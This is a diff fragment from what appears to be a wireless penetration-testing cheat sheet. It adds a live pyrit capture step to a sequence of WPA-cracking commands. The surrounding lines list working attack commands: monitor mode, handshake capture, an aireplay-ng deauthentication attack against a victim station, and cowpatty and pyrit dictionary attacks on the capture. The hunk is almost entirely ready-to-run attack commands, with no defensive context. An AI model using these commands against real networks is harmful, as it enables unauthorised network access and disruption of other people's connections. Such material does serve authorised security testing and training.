@@ -371,6 +371,8 @@ cowpatty -r [CAPTURE FILE] -d [PRECOMP HASH OUT FILE] -2 -s $ESSID
 airmon-ng start wlan0 3 #monitor mode on channel 3 
 airodump-ng -c $AP_CH --bssid $AP_MAC -w [CAPTURE FILE] $WI_INTF #start capture
 aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC $WI_INTF #deauth attack
+--Live capture with pyrit
+pyrit -r $WI_INTF -o [CAPTUREFILE] stripLive
 pyrit -r [CAPTURE FILE] analyze  #confirm successful capture
 pyrit -r [CAPTURE FILE] -o [FILTERED CAPTURE] strip
 pyrit -r [FILTERED CAPTURE] -i [WORDLIST] -b $AP_MAC attack_passthrough #dictionary attack
